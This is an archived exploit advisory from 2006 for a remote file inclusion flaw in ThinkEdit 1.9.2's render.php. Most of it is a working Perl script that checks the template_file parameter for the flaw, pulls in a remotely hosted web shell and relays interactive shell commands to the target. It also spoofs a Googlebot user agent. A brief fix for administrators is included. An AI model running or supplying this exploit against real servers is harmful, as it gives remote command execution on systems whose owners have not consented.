<html><head><title>ThinkEdit 1.9.2 (render.php) Remote File Inclusion Vulnerability</title></head><pre>#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                         ThinkEdit Remote File Inclusion Exploit                               #
#################################################################################################
# Software: ThinkEdit 1.9.2                                                                     #
#                                                                                               #
# Vendor: http://www.thinkedit.org/                                                             #
#                                                                                               #
# Released: 2006/12/08                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for ThinkEdit administrator                #
# testing purposes only!                                                                        #
#                                                                                               #
# Solution:                                                                                     #
# Add the below code to the top of render.php                                                   #
# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #
#    die();                                                                                     #
#                                                                                               #
# Exploit:                                                                                      #
# perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd                           #
#                                                                                               #
# design/thinkedit/render.php?template_file=                                                    #
#################################################################################################

############################################################################
#                  Remote File Inclusion Exploiter                         #
#                                                                          #
# This script attempts to exploit a remote file include vulnerability      #
# by inserting a web shell into an include statement. A shell is then      #
# spawned.                                                                 #
#                                                                          #
# Created By r0ut3r (writ3r [at] gmail.com)                                #
############################################################################

use IO::Socket;

$port = &quot;80&quot;; # connection port
$target = @ARGV[0]; # localhost
$folder = @ARGV[1]; # /think/
$shellloc = @ARGV[2]; # http://localhost/cmd.txt
$cmdv = @ARGV[3]; # cmd
$vulnerable = false;
$s = true;

sub Header()
{
	print q {Remote File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com)
-------------------------------------------------------------------
};
}

sub Usage()
{
	print q
	{
Usage: think.pl [target] [directory] [shell_loc] [cmd_variable]
perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd
};
	exit();
}

Header();

if (!$target || !$folder || !$shellloc || !$cmdv) {
	Usage(); }

if ($s eq false) { print &quot;[-] Shell not found\n&quot;; exit(); }

# Check if the script is vulnerable and register_globals are on (if needed)
$vulnc = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
print $vulnc &quot;GET &quot;.$folder.&quot;render.php?template_file=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n&quot;;
print $vulnc &quot;Host: $target\n&quot;;
print $vulnc &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $vulnc &quot;Accept: text/html\n&quot;;
print $vulnc &quot;Connection: keep-alive\n\n&quot;;

while (&lt;$vulnc&gt;) {
	if (/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/) { $vulnerable = true; }
}

if ($vulnerable eq false) { print &quot;[-] Target not vulnerable, or register_globals could be off\n&quot;; exit(); }

print &quot;[+] Starting shell\n&quot;;
print &quot;[cmd]\$ &quot;;
$cmd = &lt;STDIN&gt;;
$cmd =~ s/ /%20/g;
while ($cmd !~ &quot;exit&quot;)
{
	$xpack = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
	print $xpack &quot;GET &quot;.$folder.&quot;render.php?template_file=&quot;.$shellloc.&quot;&amp;&quot;.$cmdv.&quot;=&quot;.substr($cmd, 0, -1).&quot; HTTP/1.1\n&quot;;
	print $xpack &quot;Host: $target\n&quot;;
	print $xpack &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
	print $xpack &quot;Accept: text/html\n&quot;;
	print $xpack &quot;Connection: keep-alive\n\n&quot;;

	print &quot;[cmd]\$ &quot;;
	$cmd = &lt;STDIN&gt;;
}

print &quot;[!] Connection to host lost...\n&quot;;

# milw0rm.com [2006-12-08]</pre></html>